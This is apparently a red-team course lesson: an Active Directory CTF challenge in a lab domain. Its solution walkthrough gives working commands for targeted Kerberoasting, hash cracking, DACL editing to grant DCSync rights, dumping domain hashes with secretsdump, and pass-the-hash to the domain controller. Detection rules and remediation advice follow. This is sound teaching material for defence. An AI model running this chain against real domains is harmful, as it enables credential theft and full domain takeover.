---
title: "Red Team CTF Sprint — Day 7: Active Directory Misconfiguration Chain"
tags: [red-team, CTF, active-directory, Kerberoasting, ASREPRoasting, GenericWrite,
  targeted-kerberoasting, DACL-abuse, T1558.003, T1558.004, T1484.001, sprint,
  advanced, challenge]
module: 08-RedTeam-03
day: 557
related_topics:
  - Red Team CTF Sprint Day 6 (Day 556)
  - AD Attack Path Analysis (Day 501)
  - Delegation Attacks (Day 543)
  - ADCS Advanced (Day 545)
  - Red Team CTF Sprint Day 8 (Day 558)
---

# Day 557 — Red Team CTF Sprint: Day 7

> "Active Directory is a permission graph. The attacker's job is to find the
> shortest path from what they have to what they want. BloodHound draws that
> graph. You just need to know how to read it — and how to walk it."
>
> — Ghost

---

## Goals

Exploit a chain of AD misconfigurations — GenericWrite on a service account,
targeted Kerberoasting, and DACL-based privilege escalation — to reach Domain
Admin without touching a single exploit. Every technique in this chain is pure
misconfiguration abuse.

**Prerequisites:** Days 501–502 (BloodHound, AD attack lab), Day 515
(Kerberoasting, AS-REP roasting), Day 543 (delegation attacks).
**Time budget:** 5 hours.

---

## Challenge — Property of the Domain

### Category
Active Directory

### Difficulty
Advanced
Estimated time: 4 hours for a student at target level

### Learning Objective
Starting from a low-privilege domain user, use BloodHound to identify an attack
path through GenericWrite → targeted Kerberoasting → cracked credentials →
DACL WriteDACL → DCSync to obtain the KRBTGT hash.

### Scenario

```
Domain: ACMELAB.LOCAL (10.10.10.0/24)
DC:     DC01.ACMELAB.LOCAL (10.10.10.10)
You have low-privilege domain credentials: helpdesk / Helpdesk2024!

BloodHound data has been pre-collected (SharpHound output provided in lab).
You do not need to run SharpHound — open the provided JSON in BloodHound.

The flag is in C:\Users\Administrator\Desktop\flag.txt on DC01.
To read it you need SYSTEM or Domain Admin on DC01.
```

### Vulnerability / Technique

T1069.002 — Permission Groups Discovery: Domain Groups
T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting
T1484.001 — Domain Policy Modification: Group Policy Modification
T1003.006 — OS Credential Dumping: DCSync

### Setup

```bash
# Lab: Docker-based Windows AD simulation (or use a real Vagrant-based AD lab)
# Recommended: TCM Security's "Practical Active Directory" lab template
# or GOAD (Game of Active Directory): https://github.com/Orange-Cyberdefense/GOAD

# Minimum configuration required:
# - DC01 (Windows Server 2019)
# - WS01 (Windows 10)
# - 3 domain users: helpdesk, svc-backup, administrator
# - helpdesk has GenericWrite on svc-backup
# - svc-backup has a SPN set (MSSQLSvc/ws01.acmelab.local:1433)
# - svc-backup has WriteDACL on the domain object
# - svc-backup's password is crackable (Password1234!)
# BloodHound JSON files for the lab are provided in lab/bloodhound/
```

### Hint Progression

1. Open BloodHound, mark `helpdesk@ACMELAB.LOCAL` as owned. Run the
   "Shortest Path from Owned Principals" query. What edge do you see
   from `helpdesk` to any service account?
2. `GenericWrite` on an account with an existing SPN means you can
   targeted-Kerberoast it without setting a new SPN — just request a
   TGS for the existing SPN and crack it offline. Use `targetedKerberoast.py`.
3. Once `svc-backup` is compromised and you see `WriteDACL` on the domain
   object, look up what DACLs allow DCSync. You need `DS-Replication-Get-Changes`
   and `DS-Replication-Get-Changes-All`.

### Solution Walkthrough

```bash
# ══════════════════════════════════════════════
# STAGE 1: BloodHound path analysis
# ══════════════════════════════════════════════

# Import pre-collected JSON into BloodHound
# Mark helpdesk@ACMELAB.LOCAL as owned
# Query: Shortest Paths from Owned Principals to Domain Admins

# BloodHound output:
#   helpdesk --[GenericWrite]--> svc-backup
#   svc-backup --[WriteDACL]--> ACMELAB.LOCAL

# ══════════════════════════════════════════════
# STAGE 2: Targeted Kerberoasting via GenericWrite
# ══════════════════════════════════════════════

# svc-backup already has a SPN → request TGS directly
python3 targetedKerberoast.py \
  -v -d acmelab.local \
  -u helpdesk -p 'Helpdesk2024!' \
  --request-user svc-backup \
  -o hashes.txt

cat hashes.txt
# → $krb5tgs$23$*svc-backup$ACMELAB.LOCAL$MSSQLSvc/ws01.acmelab.local:1433*$...

# Crack with hashcat
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
# → $krb5tgs$23$...:Password1234!

# ══════════════════════════════════════════════
# STAGE 3: WriteDACL → DCSync rights
# ══════════════════════════════════════════════

# Use svc-backup credentials to add DCSync ACEs on the domain object
python3 /opt/impacket/examples/dacledit.py \
  -action 'write' \
  -rights 'DCSync' \
  -principal 'svc-backup' \
  -target-dn 'DC=acmelab,DC=local' \
  'acmelab.local/svc-backup:Password1234!'

# Verify ACE was written
python3 /opt/impacket/examples/dacledit.py \
  -action 'read' \
  -principal 'svc-backup' \
  -target-dn 'DC=acmelab,DC=local' \
  'acmelab.local/svc-backup:Password1234!'
# → DS-Replication-Get-Changes: Allow
# → DS-Replication-Get-Changes-All: Allow

# ══════════════════════════════════════════════
# STAGE 4: DCSync — dump domain credentials
# ══════════════════════════════════════════════

python3 /opt/impacket/examples/secretsdump.py \
  -just-dc 'acmelab.local/svc-backup:Password1234!@10.10.10.10'
# → [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
# → ACMELAB.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1234abcd...
# → ACMELAB.LOCAL/Administrator:500:aad3b435b51404eeaad3b435b51404ee:abcd1234...

# ══════════════════════════════════════════════
# STAGE 5: Pass-the-Hash to DC01
# ══════════════════════════════════════════════

evil-winrm -i 10.10.10.10 \
  -u Administrator \
  -H abcd1234... -p ''

*Evil-WinRM* PS> type C:\Users\Administrator\Desktop\flag.txt
# → FLAG: CTF{bloodhound_path_walking_genericwrite_to_dcsync}
```

### Flag
`CTF{bloodhound_path_walking_genericwrite_to_dcsync}`

### Detection Writing Exercise

```
Three detection rules — one per technique:

Rule 1 — Kerberoasting detection:
  Event: Kerberos TGS request (Event ID 4769)
  Ticket options: 0x40810000 (forwardable + renewable)
  Encryption type: 0x17 (RC4 — legacy, used by kerberoasting tools)
  Alert when: volume > 3 per source IP in 60s, OR enc type = 0x17

Rule 2 — ACE write to domain object:
  Event: Event ID 4662 (operation performed on an AD object)
  Object: domain root DN (DC=acmelab,DC=local)
  Property: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes)
  Alert: any non-admin write of replication rights to domain object

Rule 3 — DCSync from non-DC:
  Event: Event ID 4662 on DC for DS-Replication properties
  Source: IP address that is NOT listed as a Domain Controller
  Alert: replication operation from unknown source IP

Write the Sigma YAML for Rule 3:
_______________________________________________________________
```

### Debrief Points

```
1. GenericWrite is a high-value edge in BloodHound. It means the attacker can
   modify most attributes of the target object, including its SPN (to enable
   Kerberoasting), its userAccountControl (to enable AS-REP roasting), and its
   msDS-KeyCredentialLink (to enable Shadow Credentials). A single
   GenericWrite can be converted into credential access.

2. Targeted Kerberoasting produces the same TGS hash as traditional
   Kerberoasting — it is cracked the same way. The difference is surgical
   targeting: traditional Kerberoasting requests TGS for every SPN in the
   domain; targeted Kerberoasting requests exactly one.

3. WriteDACL on the domain object is effectively Domain Admin — it allows
   granting replication rights to any principal, enabling DCSync.
   BloodHound highlights this edge specifically because it is rarely
   necessary for legitimate operations.

4. DCSync from a non-DC is almost always malicious. Domain controllers
   replicate with each other; applications do not replicate from DCs.
   The Event ID 4662 rule catches this reliably in patched environments.

5. This entire chain requires no exploits — no CVEs, no buffer overflows,
   no zero-days. It is entirely misconfiguration abuse. The fix is
   quarterly BloodHound audits and removal of non-essential ACEs.
```

---

## Engagement Log — Day 7 Sprint

```
Time    | Action                                         | Result
--------|------------------------------------------------|-------
        | BloodHound attack path identified              |
        | TGS hash for svc-backup obtained               |
        | Hash cracked offline                           |
        | WriteDACL ACE written to domain object         |
        | DCSync completed — KRBTGT hash obtained        |
        | PTH to DC01 — Administrator shell              |
        | Flag retrieved                                 |

Detection rules written: [ ] Kerberoast  [ ] WriteDACL  [ ] DCSync
Flag captured: [ ] Yes  [ ] No
Total time: _____ minutes
```

---

## Key Takeaways

1. BloodHound is not optional in AD engagements. No human can reliably find
   complex ACL-based attack paths by manual enumeration. Run BloodHound,
   read the graph, and walk the shortest path.
2. Service accounts with SPNs that have weak passwords are universally crackable
   given enough time. Password spraying is noisy; Kerberoasting is not.
   Service accounts should have long, random passwords (30+ characters) or use
   Managed Service Accounts (MSA/gMSA) that rotate automatically.
3. ACEs on the domain object should be audited regularly. Anything granting
   replication rights to a non-DC principal is an immediate finding.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q557.1, Q557.2 …).

---

## Navigation

← Previous: [Day 556 — Red Team CTF Sprint: Day 6](DAY-0556-Red-Team-CTF-Sprint-Day-6.md)
→ Next: [Day 558 — Red Team CTF Sprint: Day 8](DAY-0558-Red-Team-CTF-Sprint-Day-8.md)
